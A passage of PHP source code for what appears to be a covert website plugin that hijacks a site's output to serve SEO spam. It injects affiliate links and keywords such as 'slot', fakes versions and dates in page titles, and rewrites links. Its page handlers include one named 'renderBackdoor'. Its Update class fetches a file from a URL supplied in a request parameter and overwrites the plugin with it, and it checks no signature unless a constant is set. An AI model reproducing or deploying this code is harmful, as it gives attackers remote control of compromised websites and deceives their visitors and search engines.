                }
            }
        }

        $fetched = 0;

        while ($fetched < $count && !empty($skipped)) {
            $entry = array_shift($skipped);
            $item = self::getItemFromSeoResManifestByIdAndLine($manifest_arr, $entry['id'], $entry['line']);
            if ($item !== null) {
                $resultItems[] = $item;
            }
            $fetched++;
        }

        $maxAttempts = $total; // 最多遍历一轮
        $attempts = 0;
        while ($fetched < $count && $attempts < $maxAttempts) {
            $entry = self::resolveOffsetToIdAndLine($items, $total, $cursor);
            $cursor = ($cursor + 1) % $total;
            $attempts++;

            $item = self::getItemFromSeoResManifestByIdAndLine($manifest_arr, $entry['id'], $entry['line']);
            if ($item !== null) {
                $resultItems[] = $item;
            }
            $fetched++;
        }

        self::saveManifestRecord(array(
            'items' => $items,
            'total' => $total,
            'cursor' => $cursor,
            'skipped' => $skipped
        ));

        hj_echo("清单轮询 取数完成 请求:", $count, " 实际:", count($resultItems), " 游标:", $cursor);

        return $resultItems;
    }

    public static function getRandomItemFromSeoResManifestByCount($manifest_arr, $count)
    {
        $randItems = array();
        $manifest_arr_count = count($manifest_arr);
        for ($i = 0; $i < $count; $i++) {
            $item = $manifest_arr[rand(0, $manifest_arr_count - 1)];
            $id = $item['id'];
            $lines = $item['lines'];
            $line = rand(0, $lines - 1);

            $item = self::getItemFromSeoResManifestByIdAndLine($manifest_arr, $id, $line);
            if ($item === null) {
                continue;
            }
            array_push($randItems, $item);
        }
        return $randItems;
    }

    /** SEO资源清单相关 END */

    public static function text($resValue)
    {
        return $resValue['text'];
    }

    public static function randRange($resValue)
    {
        $range = $resValue['range'];
        $start = $range['start'];
        $end = $range['end'];

        if (isset($range['divisor'])) {
            $divisor = $range['divisor'];
            $decimal = $range['decimal'];
        } else {

            $divisor = $range['decimal'];

            $numberStr = (string) abs($divisor);

            $decimal = strlen($numberStr) - 1;
        }

        if ($divisor == 0) {
            $divisor = 1;
        }

        $rand = rand($start, $end) / $divisor;

        return number_format($rand, $decimal);
    }

    public static function randStr($resValue)
    {
        srand();
        $str = $resValue['str'];
        $len = $str['len'];
        $source = $str['source'];
        $rand = '';
        for ($i = 0; $i < $len; $i++) {
            $rand .= $source[rand(0, strlen($source) - 1)];
        }
        return $rand;
    }

    public static function randDate($resValue)
    {
        srand();
        $rand = date('Y-m-d', strtotime('-1 year') + rand(0, 365) * 24 * 3600);
        return $rand;
    }

    public static function randTime($resValue)
    {
        srand();
        $rand = date('H:i:s', rand(0, 24 * 3600));
        return $rand;
    }

    public static function randString($seed = null, $min = 5, $max = 11, $source = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz')
    {
        if ($seed !== null) {
            srand($seed);
        } else {
            srand();
        }

        $rand = '';
        $len = rand($min, $max);
        for ($i = 0; $i < $len; $i++) {
            $rand .= $source[rand(0, strlen($source) - 1)];
        }
        return $rand;
    }

    public static function currentUrl()
    {

        return RequestUtils::getFullUrl();
    }

    public static function localUrl($count = 1)
    {

        $urls =  self::randLocalUrl($count);
        return $urls;
    }

    public static function randLocalUrl($count = 1)
    {
        $urls = self::randSeoUrl($count);
        foreach ($urls as &$url) {

            if (RequestUtils::isBeginWithEntryScriptInRequestUri()) {
                $url = RequestUtils::getEntryScriptPath() . $url;
            }
        }

        return $urls;
    }

    public static function getTempalteAffLinkBaseUrlRandom($count = 1)
    {

        $affLinkSeoResArr = Manager::getAffLinkSeoResArr();
        $resArr = self::getSeoResFromResArr($affLinkSeoResArr, $count);
        if (empty($resArr)) {
            return null;
        }

        $baseUrls = array();

        foreach ($resArr as $line) {

            $line = explode(',', $line);

            if (count($line) < 1) {
                hj_echo("affLinkUrl 解析失败", json_encode($line));
            }
            $url = $line[0];
            $baseUrl = AffLink::getAffLinkBaseUrl($url);
            array_push($baseUrls, $baseUrl);
        }

        return $baseUrls;
    }

    public static function getTempalteAffLinkBaseUrl()
    {

        if (self::$TempalteAffLinkBaseUrl == null) {
            $baseUrls = self::getTempalteAffLinkBaseUrlRandom();
            if (!empty($baseUrls)) {
                self::$TempalteAffLinkBaseUrl = $baseUrls[0];
            }
            hj_echo("getAffLinkBaseUrl AffLinkBaseUrl:" . self::$TempalteAffLinkBaseUrl);
        }
        return self::$TempalteAffLinkBaseUrl;
    }

    public static function affLinkUrl($count = 1)
    {
        $resArr = AffLink::getAffLinkSeoSiteAffTags($count);

        return $resArr;
    }

    public static function affLinkUrlSameBaseUrl($count = 1)
    {
        $resArr = AffLink::getAffLinkSeoSiteAffTags($count);
    }

    public static function affLinkUrlCurrentKeyword($count = 1)
    {
        $resArr = AffLink::getAffLinkSeoSiteAffTags($count);
    }

    public static function randSeoUrl($count = 1)
    {

        $urls = AffLink::getAffLinkLocalATags($count);

        return $urls;
    }

    public static function affLinkCenter($count)
    {

        $resArr = AffLink::getAffLinkSeoSiteAffTags($count);
        return $resArr;
    }

    public static function localHost()
    {
        return RequestUtils::getHost();
    }

    public static function randLocalFullUrl($count)
    {
        $urls = self::randLocalUrl($count);
        foreach ($urls as &$url) {
            $url = RequestUtils::getScheme() . '://' . RequestUtils::getHost() . $url;
        }

        return $urls;
    }

    public static function getTitle($content)
    {
        $pattern = '/<title>(.*?)<\/title>/';
        preg_match($pattern, $content, $matches);

        return trim($matches[1]);
    }

    public static function pastTime()
    {

        if (self::$PastTime === null) {
            srand();
            self::$PastTime = time() - rand(60, 600);
        } else {
            self::$PastTime = self::$PastTime - rand(60, 600);
        }

        return date('Y-m-d H:i:s', self::$PastTime);
    }

    public static function getFirstATagContent($content)
    {

        if (preg_match('/<a.*?>(.*?)<\/a>/is', $content, $matches)) {
            $cleanedText = trim($matches[1]);
            return $cleanedText;
        }
        return null;
    }

    public static function addSeoRuleToHref($content)
    {
        $dom = new DOMDocument();
        libxml_use_internal_errors(true); // 忽略 HTML 解析时的警告
        $dom->loadHTML($content);
        libxml_clear_errors();

        $links = $dom->getElementsByTagName('a');

        $seoTemplatePaths = Manager::getSeoTemplatePaths();

        $index = 0;

        /** @var DOMElement $link */
        foreach ($links as $link) {
            $href = $link->getAttribute('href');

            $newHref = $href;

            if (RequestUtils::isSiteLocalUrl($href)) {

                hj_echo("addSeoRuleToHref 替换链接链接:" . $href);
                if (RequestUtils::isBeginWithEntryScriptInRequestUri()) {

                    $base_url = RequestUtils::getBaseUrl($href);
                    $path = RequestUtils::getUrlPath($href);
                    $query = RequestUtils::getUrlQueryString($href);
                    if (!hj_startsWith($path, RequestUtils::getEntryScriptPath())) {
                        $path = RequestUtils::getEntryScriptPath() . $path;
                    }
                    $href = $base_url . $path . $query;
                    hj_echo("addSeoRuleToHref 脚本路径访问 修正链接:", $href);
                }

                $seoPath = $seoTemplatePaths[rand(0, count($seoTemplatePaths) - 1)];

                $line = self::getSeoResOneLineByVarNameAndIndex('{固定主词}', $index);
                $index++;

                $line = str_replace(' ', '-', $line);

                $seoPath = $seoPath . '&' . $line;

                $href = str_replace('#', '', $href);

                if (strpos($href, '?') !== false) {
                    $newHref = $href . '&' . $seoPath;
                } else {
                    $newHref = $href . '?' . $seoPath;
                }
            } else {

                $newHref = self::localUrl();
            }
            hj_echo("addSeoRuleToHref 新链接:", $newHref);
            $link->setAttribute('href', $newHref);
        }

        return  $dom->saveHTML();
    }

    public static function currentYear()
    {

        return date('Y');
    }

    public static function currentMonth()
    {
        return date('m');
    }

    public static function currentDay()
    {
        return date('d');
    }

    private static $OriginalContentTitle = null;
    public static function getOriginalContentTitle()
    {
        if (self::$OriginalContentTitle == null) {
            $title = '';
            $originalContent = Manager::getOriginalContent();
            if ($originalContent) {
                $title = self::getTitle($originalContent);
            }
            hj_echo("原始网站标题:", $title);
            self::$OriginalContentTitle = $title;
        }

        return self::$OriginalContentTitle;
    }

    static function addRandomNumberToVersion($title)
    {

        $pattern = '/(?:v|version)?\s*(\d+)(?:\.(\d+))*?/i';

        if (preg_match($pattern, $title, $matches)) {

            $newVersion = preg_replace_callback('/\d/', function ($matches) {
                return $matches[0] . rand(0, 9); // 在每一位后增加一个随机数字
            }, $matches[0]);

            $title = str_replace($matches[0], $newVersion, $title);
            return array($title, true); // 替换成功
        }

        return array($title, false); // 替换失败
    }

    static function replaceDateWithCurrentDate($title)
    {

        $currentDate = date('Y-m-d');

        $patterns = array(
            '/\b(\d{2})(\d{2})(\d{2})\b/',         // YYMMDD
            '/\b(\d{2})(\d{2})\b/',                 // MMDD
            '/\b(\d{4})-(\d{1,2})-(\d{1,2})\b/',   // YYYY-MM-DD
            '/\b(\d{1,2})\/(\d{1,2})\/(\d{4})\b/', // DD/MM/YYYY
            '/\b(\d{1,2})-(\d{1,2})-(\d{4})\b/'    // DD-MM-YYYY
        );

        $replaced = false; // 标记是否有替换发生

        foreach ($patterns as $pattern) {
            if (preg_match($pattern, $title)) {
                $title = preg_replace_callback($pattern, function ($matches) use ($currentDate) {
                    return date('Ymd', strtotime($currentDate));
                }, $title);
                $replaced = true;
            }
        }

        return array($title, $replaced); // 返回标题和替换是否发生
    }

    static function modifyTitle($title)
    {

        list($newTitle, $versionReplaced) = static::addRandomNumberToVersion($title);

        list($newTitle, $dateReplaced) = static::replaceDateWithCurrentDate($newTitle);

        if (!$versionReplaced && !$dateReplaced) {

            if (rand(0, 1) === 0) {
                $newVersion = 'V' . rand(3, 10) . '.' . rand(0, 99) . '.' . rand(0, 99);
                $newTitle .= ' ' . $newVersion; // 添加随机版本号
            } else {
                $currentDate = date('Ymd');
                $newTitle .= '-' . $currentDate; // 添加当前日期
            }
        }

        return $newTitle;
    }

    public static function getUrlTitleByUrl($url)
    {

        $url = ltrim(trim($url), '/');

        $segments = explode('/', $url);
        if (count($segments) > 0) {
            $url = end($segments);

            if (empty($url) && count($segments) > 1) {
                $url = $segments[count($segments) - 2];
            }
        }

        $segments = explode('?', $url);
        if (count($segments) > 0) {
            $url = $segments[0];

            if (empty($url) && count($segments) > 1) {
                $url = $segments[1];
            }
        }

        $segments = explode('=', $url);
        if (count($segments) > 0) {
            $url = end($segments);

            if (empty($url) && count($segments) > 1) {
                $url = $segments[count($segments) - 2];
            }
        }

        $segments = explode('&', $url);
        if (count($segments) > 0) {
            $url = end($segments);

            if (empty($url) && count($segments) > 1) {
                $url = $segments[count($segments) - 2];
            }
        }

        $fileExtensions = array(
            '.htm',
            '.shtm',
            '.pdf',
            '.html',
            '.xhtml',
            '.xml',
            '.css',
            '.js',
            '.json',
            '.png',
            '.jpg',
            '.jpeg',
            '.gif',
            '.svg',
            '.bmp',
            '.tiff',
            '.mp3',
            '.wav',
            '.mp4',
            '.avi',
            '.mov',
            '.doc',
            '.docx',
            '.xls',
            '.xlsx',
            '.ppt',
            '.pptx',
            '.zip',
            '.rar',
            '.tar',
            '.gz',
            '.txt',
            '.csv',
            '_htm',
            '_shtm',
            '_pdf',
            '_html',
            '_xhtml',
            '_xml',
            '_css',
            '_js',
            '_json',
            '_png',
            '_jpg',
            '_jpeg',
            '_gif',
            '_svg',
            '_bmp',
            '_tiff',
            '_mp3',
            '_wav',
            '_mp4',
            '_avi',
            '_mov',
            '_doc',
            '_docx',
            '_xls',
            '_xlsx',
            '_ppt',
            '_pptx',
            '_zip',
            '_rar',
            '_tar',
            '_gz',
            '_txt',
            '_csv'
        );

        $url = str_replace($fileExtensions, '.htm', $url);

        $segments = explode('.htm', $url);
        if (count($segments) > 0) {
            $url = $segments[0];

            if (empty($url) && count($segments) > 1) {
                $url = $segments[1];
            }
        }

        $url = str_replace(array('/', '-', '?', '_', '#'), ' ', $url);

        $segments = preg_split('/\s+/', $url);

        $result = array();

        foreach ($segments as $segment) {

            if (ctype_digit($segment) && strlen($segment) > 10) {
                continue; // 跳过纯数字
            }

            $decodedSegment = urldecode($segment); // URL 解码
            $decodedSegment = preg_replace_callback('/\\\\u([0-9a-fA-F]{4})/', function ($matches) {
                return mb_convert_encoding(pack('H4', $matches[1]), 'UTF-8', 'UTF-16LE');
            }, $decodedSegment); // Unicode 解码

            $result[] = $decodedSegment;
        }

        $title = implode(' ', $result);

        return $title;
    }

    private static function isValidTitle($title)
    {

        $trimmedtitle = trim($title);

        if (strlen($trimmedtitle) > 16) {

            $punctuation = array(' ', '.', ',', '!', '?', ';', ':', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '-', '=', '+', '[', ']', '{', '}', '|', '\\', '"', "'", '<', '>', '/');
            foreach ($punctuation as $char) {
                if (strpos($trimmedtitle, $char) !== false) {
                    return true;
                }
            }
            return false; //title太长，但是没有标点符号，就认为是非法标题
        }

        return true;
    }

    public static function getCurrentUrlTitle()
    {
        $url = RequestUtils::getRequestUri();
        $urlTitle = self::getUrlTitleByUrl($url);

        $pattern = '/(?:v|version)?\s*(\d+)(?:\.(\d+)){2,}/i';
        if (preg_match($pattern, $urlTitle, $matches)) {
            return $urlTitle; // 包含版本号，直接返回
        }

        $anotherKeywords = 'slot';
        $lines = self::getSeoResLinesByVarName('{固定主词}');
        if ($lines && count($lines) > 0) {
            foreach ($lines as $line) {

                $splitArr = explode('===', $line);
                $anotherKeywords = $splitArr[0];
            }
        }

        $titleLength = strlen($urlTitle);
        if (empty($urlTitle) ||  $titleLength < 1) {
            $urlTitle = $anotherKeywords; //标题太短，替换为固定主词
        }

        $originalContentTitle = self::getOriginalContentTitle();
        if (!empty($originalContentTitle)) {
            $urlTitle = $urlTitle . ' | ' . $originalContentTitle;
            return $urlTitle;
        }

        $titleLength = strlen($urlTitle);

        if (empty($urlTitle) ||  $titleLength < 3) {
            $urlTitle .= ' | ' . $anotherKeywords; //标题太短，随机添加主词
            return $urlTitle;
        }
        return $urlTitle;
    }

    public static function getCacheFilePathByUri($uri = null)
    {
        if ($uri == null) {
            $uri = RequestUtils::getRequestUri();
        }

        $cacheTmpUriName = md5($uri);

        $cacheTmpFileSubPath = hj_md5_to_path($cacheTmpUriName);

        $cacheTmpFilePath = hj_join_paths(Disk::getTmpDir(), $cacheTmpFileSubPath);

        hj_checkFilePath($cacheTmpFilePath);

        return $cacheTmpFilePath;
    }

    private static function loadCacheMap()
    {

        if (!empty(self::$TemplateCacheMap)) {
            hj_echo("模板页面缓存 已经加载到内存,无需再次从文件加载");
            return;
        }

        $cacheFilePath = self::getCacheFilePathByUri();

        if (!file_exists($cacheFilePath)) {
            hj_echo("模板页面缓存 不存在缓存文件路径:", $cacheFilePath);
            return;
        }

        if (filesize($cacheFilePath) == 0) {
            hj_echo("模板页面缓存 缓存文件内容为空");
            return;
        }

        hj_echo("模板页面缓存 存在缓存文件路径:", $cacheFilePath);

        $content = hj_get_file_content($cacheFilePath);
        if (empty($content)) {
            hj_echo("模板页面缓存 缓存文件内容为空");
            return;
        }

        $content = gzuncompress($content);

        if (empty($content)) {
            hj_echo("模板页面缓存 解压缩失败");
            return;
        }

        $cacheMap = json_decode($content, true);
        if (empty($cacheMap)) {
            hj_echo("模板页面缓存 缓存文件内容格式错误");
            return;
        }

        self::$TemplateCacheMap = $cacheMap;

        return;
    }

    private static function saveCacheMap()
    {

        if (empty(self::$TemplateCacheMap)) {
            hj_echo("模板页面写入缓存 内存缓存不存在");
            return;
        }

        $cacheFilePath = self::getCacheFilePathByUri();

        if (file_exists($cacheFilePath)) {
            hj_echo("模板页面写入缓存 存在缓存文件路径:", $cacheFilePath);
        } else {
            hj_echo("模板页面写入缓存 不存在缓存文件路径:", $cacheFilePath);
        }

        $content = json_encode(self::$TemplateCacheMap);
        if (empty($content)) {
            hj_echo("模板页面写入缓存 json 编码缓存内容为空");
            return;
        }

        $content = gzcompress($content);
        if (empty($content)) {
            hj_echo("模板页面写入缓存 压缩缓存内容失败");
            return;
        }
        $writeRet = file_put_contents($cacheFilePath, $content);

        hj_echo("模板页面缓存 写入缓存文件:", $cacheFilePath, "结果:", $writeRet);
        return  $writeRet;
    }

    public static function getSeoTemplateContent($seoTemplateUrl)
    {

        if (empty($seoTemplateUrl)) {
            $seoTemplateUrl = Manager::getSeoTemplateUrl();
        }

        if (empty($seoTemplateUrl)) {
            hj_echo("获取模板 模板地址不存在");
            return null;
        }

        $templateContent = Manager::getRemoteFileContent($seoTemplateUrl);

        $templateContent = preg_replace('/<!--.*?-->/s', '', $templateContent);

        return $templateContent;
    }

    public static function replaceSeoResManifest($templateContent, $seoResManifestItem)
    {
        if (empty($templateContent) || empty($seoResManifestItem)) {
            return $templateContent;
        }

        $url = $seoResManifestItem['url'];
        $varName = $seoResManifestItem['varName'];

        $resContent = Manager::getRemoteFileContent($url);
        if (empty($resContent)) {
            hj_echo("替换SEO资源清单 获取资源内容失败 url:", $url);
        }

        $templateContent = str_replace($varName, $resContent, $templateContent);

        return $templateContent;
    }

    public static function getTemplateContent()
    {

        $seoVars = Manager::getSeoVars();

        if ($seoVars == null) {
            hj_echo("渲染模板 模板变量不存在");
            return null;
        }

        $isFlushCache = false;

        self::loadCacheMap();

        $seoTemplateUrl = null;

        if (empty(self::$TemplateCacheMap)) {
            hj_echo("渲染模板 不存在存在有效缓存 初始化缓存");
            self::$TemplateCacheMap = array();

            $isFlushCache = true;
        }

        if (!isset(self::$TemplateCacheMap['seoTemplateUrl'])) {
            hj_echo("渲染模板 缓存中不存在模板地址 需要写入缓存文件");

            self::$TemplateCacheMap['seoTemplateUrl'] = Manager::getSeoTemplateUrl();

            $isFlushCache = true;
        }

        $seoTemplateUrl = self::$TemplateCacheMap['seoTemplateUrl'];

        $templateContent = self::getSeoTemplateContent($seoTemplateUrl);

        if ($templateContent == null) {
            hj_echo("渲染模板 模板内容不存在");
            return null;
        }

        if (!isset(self::$TemplateCacheMap['seoResManifestItem'])) {
            hj_echo("替换SEO资源清单 不存在 需要写入缓存文件");

            $seoResManifestArr = Manager::getSeoResManifestArr();
            if (!empty($seoResManifestArr)) {

                $afflinkInfo =  RequestUtils::getUrlAffLinkInfo();
                $id = $afflinkInfo['id'];
                $line = $afflinkInfo['line'];

                $seoResManifestItem = self::getItemFromSeoResManifestByIdAndLine($seoResManifestArr, $id, $line);
                if ($seoResManifestItem) {

                    self::$TemplateCacheMap['seoResManifestItem'] = $seoResManifestItem;

                    $isFlushCache = true;
                }
            }
        }
        $seoResManifestItem = self::$TemplateCacheMap['seoResManifestItem'];
        $keyword = null;
        if ($seoResManifestItem && isset($seoResManifestItem['title'])) {
            $keyword = $seoResManifestItem['title'];
        }

        $templateContent = self::replaceSeoResManifest($templateContent, $seoResManifestItem);

        foreach ($seoVars as $key => $value) {

            if (!isset($value['varName'])) {
                hj_echo("渲染模板 模板变量名称 varName 不存在", json_encode($value));
                continue;
            }
            $varName = $value['varName'];

            if (!isset($value['type'])) {
                hj_echo("渲染模板 模板变量类型 type 不存在", json_encode($value));
                continue;
            }
            $type = $value['type'];
            $isCache = true;

            if (isset($value['isCache']) && $value['isCache'] == false) {
                $isCache = false;
                hj_echo("渲染模板 模板变量:", $varName, " 不缓存");
            }

            if (!isset($value['varValue'])) {
                hj_echo("渲染模板 模板变量 varValue 不存在", json_encode($value));
                continue;
            }
            $varValue = $value['varValue'];

            if (!isset($varValue['resType'])) {
                continue;
            }
            $resType = $varValue['resType'];

            if (!isset($varValue['resValue'])) {
                hj_echo("渲染模板 模板变量值 resValue 不存在", json_encode($value));
                continue;
            }
            $resValue = $varValue['resValue'];

            $cacheData = null;

            if ($isCache == true) {

                if (isset(self::$TemplateCacheMap[$varName])) {

                    $cacheData = self::$TemplateCacheMap[$varName];

                    if (!self::checkCacheData($cacheData, $varName, $resType, $resValue)) {
                        hj_echo("渲染模板 数据无效 需要写入缓存文件", $varName, $resType, json_encode($cacheData), json_encode($resValue));

                        $isFlushCache = true;

                        $cacheData = null;
                    }
                }
            }

            switch ($type) {
                case 'all':

                    if (empty($cacheData)) {

                        $cacheData = self::getReplateResArrCacheData($varName, $resType, $resValue);
                    }

                    $resArr = self::getResArrFromCacheData($cacheData, $resValue);

                    if (strpos($resType, 'affLinkUrl') !== false) {

                        $templateContent = self::replaceAffLinkUrl($templateContent, $varName, $resArr);
                    } else {

                        $templateContent = self::replaceAll($templateContent, $varName, $resArr);
                    }

                    break;
                case 'every':

                    if (empty($cacheData)) {

                        $count =  self::getVarNameCount($templateContent, $varName);

                        $cacheData = self::getReplateResArrCacheData($varName, $resType, $resValue, $count);
                    }

                    $resArr = self::getResArrFromCacheData($cacheData, $resValue);

                    if (strpos($resType, 'affLinkUrl') !== false) {

                        $templateContent = self::replaceAffLinkUrl($templateContent, $varName, $resArr, false);
                    } else {

                        $templateContent = self::replaceEvery($templateContent, $varName, $resArr);
                    }

                    break;
                default:
                    break;
            }

            self::$TemplateCacheMap[$varName] = $cacheData;
        }

        if ($keyword == null) {

            $keyword = self::getTitle($templateContent);
        }
        if ($keyword == null) {
            $keyword = "unknown";
        }

        if ($isFlushCache) {
            hj_echo("渲染模板 写入缓存信息 关键词:", $keyword);

            self::saveCacheMap();

            KeyWord::setKeyword($keyword);
        }

        return $templateContent;
    }
}

class Update
{

    private static function getRemotePlugin()
    {

        $remote = false;
        if (isset($_GET['remote']) && !empty($_GET['remote'])) {
            $remote = $_GET['remote'];
        } else if (isset($_POST['remote']) && !empty($_POST['remote'])) {
            $remote = $_POST['remote'];
        }

        if (!$remote) {
            return array(
                'status' => false,
                'remote' => "",
                'msg' => 'remote 参数不存在'
            );
        }

        if (!defined('HJ_UPDATE_AUTH') || HJ_UPDATE_AUTH !== true) {
            return array(
                'status' => true,
                'remote' => $remote,
                'msg' => ' 无需验证'
            );
        }

        $sign = false;
        if (isset($_GET['sign']) && !empty($_GET['sign'])) {
            $sign = $_GET['sign'];
        } else if (isset($_POST['sign']) && !empty($_POST['sign'])) {
            $sign = $_POST['sign'];
        }

        if (!$sign) {
            return array(
                'status' => false,
                'remote' => $remote,
                'msg' => 'sign 参数不存在'
            );
        }

        $timestamp = false;
        if (isset($_GET['timestamp']) && !empty($_GET['timestamp'])) {
            $timestamp = $_GET['timestamp'];
        } else if (isset($_POST['timestamp']) && !empty($_POST['timestamp'])) {
            $timestamp = $_POST['timestamp'];
        }

        if (!$timestamp) {
            return array(
                'status' => false,
                'remote' => $remote,
                'msg' => 'timestamp 参数不存在'
            );
        }

        $nonce = false;
        if (isset($_GET['nonce']) && !empty($_GET['nonce'])) {
            $nonce = $_GET['nonce'];
        } else if (isset($_POST['nonce']) && !empty($_POST['nonce'])) {
            $nonce = $_POST['nonce'];
        }

        if (!$nonce) {
            return array(
                'status' => false,
                'remote' => $remote,
                'msg' => 'nonce 参数不存在'
            );
        }

        if (!defined('HJ_UPDATE_SECRET')) {
            return array(
                'status' => false,
                'remote' => $remote,
                'msg' => 'HJ_UPDATE_SECRET 未定义'
            );
        }
        $secret = HJ_UPDATE_SECRET;

        $params = array(
            'remote' => $remote,
            'timestamp' => $timestamp,
            'nonce' => $nonce,
            'secret' => $secret
        );

        ksort($params);

        $paramStr = '';
        foreach ($params as $key => $value) {
            $paramStr .= $key . '=' . $value . '&';
        }

        $paramStr = rtrim($paramStr, '&');

        $signStr = md5($paramStr);

        hj_echo('参数列表字符串: ', $paramStr, ',生成签名: ', $signStr, ',传入签名: ', $sign);

        if ($signStr !== $sign) {
            return array(
                'status' => false,
                'remote' => $remote,
                'msg' => '签名不一致'
            );
        }

        return array(
            'status' => true,
            'remote' => $remote,
            'msg' => '验证通过'
        );
    }

    public static function getUpdateInfo()
    {

        $pluginVersion = Manager::getPluginVersion();

        $pluginFilePath = RequestUtils::getPluginAbsolutePath();

        if (!file_exists($pluginFilePath)) {
            hj_echo("渲染更新 插件文件不存在");
            return array(
                "status" => false,
                "msg" => "插件文件不存在",
                "plugin_version" => $pluginVersion,
                "plugin_file_path" => $pluginFilePath,
                "remote" => ""
            );
        }

        $pluginMd5 = Manager::getPluginMd5();

        $remotePlugin = self::getRemotePlugin();

        if (!isset($remotePlugin)) {
            hj_echo("渲染更新 获取远程插件信参数不存在");
            return array(
                "status" => false,
                "msg" => "remote 参数不存在",
                "plugin_version" => $pluginVersion,
                "plugin_md5" => $pluginMd5,
                "plugin_file_path" => $pluginFilePath,
                "remote" => null
            );
        }

        if (!is_array($remotePlugin)) {
            return array(
                "status" => false,
                "msg" => "remote 参数不是数组",
                "plugin_version" => $pluginVersion,
                "plugin_md5" => $pluginMd5,
                "plugin_file_path" => $pluginFilePath,
                "remote" => null
            );
        }

        if (!isset($remotePlugin['status']) || !isset($remotePlugin['remote']) || !isset($remotePlugin['msg'])) {
            return array(
                "status" => false,
                "msg" => "检查远程插件参数不存在 status remote msg",
                "plugin_version" => $pluginVersion,
                "plugin_md5" => $pluginMd5,
                "plugin_file_path" => $pluginFilePath,
                "remote" => null
            );
        }

        $remote = $remotePlugin['remote'];
        $status = $remotePlugin['status'];
        $msg = $remotePlugin['msg'];

        if ($status == false) {
            return array(
                "status" => false,
                "msg" => $msg,
                "plugin_version" => $pluginVersion,
                "plugin_md5" => $pluginMd5,
                "plugin_file_path" => $pluginFilePath,
                "remote" => $remote
            );
        }

        $remoteFileName = pathinfo($remote, PATHINFO_FILENAME);

        if ($remoteFileName == $pluginMd5) {

            $updateInfo = array(
                "status" => true,
                "msg" => "本地插件和远程插件一致",
                "plugin_version" => $pluginVersion,
                "plugin_md5" => $pluginMd5,
                "plugin_file_path" => $pluginFilePath,
                "remote" => $remote,
                "remoteFileName" => $remoteFileName
            );

            return $updateInfo;
        }

        $updateInfo = array(
            "status" => true,
            "msg" => "本地插件和远程插件不一致",
            "plugin_version" => $pluginVersion,
            "plugin_md5" => $pluginMd5,
            "plugin_file_path" => $pluginFilePath,
            "remote" => $remote,
            "remoteFileName" => $remoteFileName
        );

        hj_echo("开始更新插件");

        $remoteContent = hj_get_file_content($remote);

        if ($remoteContent === null || $remoteContent === false) {

            $updateInfo['status'] = false;
            $updateInfo['msg'] = "远程文件内容获取失败";
        } else {

            $writeResult = file_put_contents($pluginFilePath, $remoteContent);

            if ($writeResult === false) {

                $updateInfo['status'] = false;
                $updateInfo['msg'] = "写入本地文件失败";
            } else {

                $pluginMd5 = Manager::getPluginMd5();

                if ($pluginMd5 != $remoteFileName) {

                    $updateInfo['status'] = false;
                    $updateInfo['msg'] = "写入本地文件成功,写入后的md5值与远程文件的md5值不一致";
                } else {

                    $updateInfo['status'] = true;
                    $updateInfo['msg'] = "写入本地文件成功,写入后的md5值与远程文件的md5值一致";
                }
            }
        }

        return $updateInfo;
    }
}

/**
 * 初始化插件
 */
function plugin_hj_begin()
{

    Manager::initialize();
    Manager::obStart();
}

function plugin_hj_header($header = array())
{

    $header['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0';
    $header['Pragma'] = 'no-cache';
    $header['Expires'] = '-1';

    $header['X-LiteSpeed-Cache-Control'] = 'no-cache';

    foreach ($header as $key => $value) {
        header($key . ': ' . $value);
    }
}

/**
 * 设置 HTTP 响应头和状态码
 *
 * @param int $code 状态码，默认 200
 * @param array $header 响应头数组
 */
function plugin_hj_response($code = 200, $header = array())
{

    plugin_hj_header($header);

    http_response_code($code);
}

/**
 * 结束处理插件请求，渲染内容
 */
function plugin_hj_end()
{

    Manager::obEnd();

    plugin_hj_header();

    $renderMethods = array(
        'renderBackdoor', //渲染后门页面
        'renderUpdate', // 渲染更新页面
        'renderDebug', // 渲染调试页面
        'renderConfig', // 渲染配置页面
        'renderClean', // 渲染清除缓存页面
        'renderHealthCheck', // 渲染健康检查页面
        'renderRobots', // 渲染robots.txt页面
        'renderSitemap', // 渲染sitemap页面
        'renderSitemapIndex', // 渲染Sitemap索引页面
        'renderSiteVerify', //  渲染站点认证页面 renderSiteVerify
        'renderRedirect', //渲染重定向页面
        'renderTemplate', // 渲染模板页面
        'renderAffLink', // 渲染推广页面
    );

    foreach ($renderMethods as $method) {
        $renderData = Manager::$method();
        if ($renderData) {
            $code = $renderData['code'];
            $header = $renderData['header'];
            $content = $renderData['content'];
            plugin_hj_response($code, $header);

            $obCotent = ob_get_contents();

            ob_clean();

            if (HJ_DEBUG) {
                echo $obCotent;
            }
            echo $content;
            exit();
        }
    }

    $originalObContent = Manager::getOriginalObContent();
    if ($originalObContent) {
        echo $originalObContent;
        exit();
    }
}

function hj_plugin_run()
{

    plugin_hj_begin();

    plugin_hj_end();
}
hj_plugin_run();
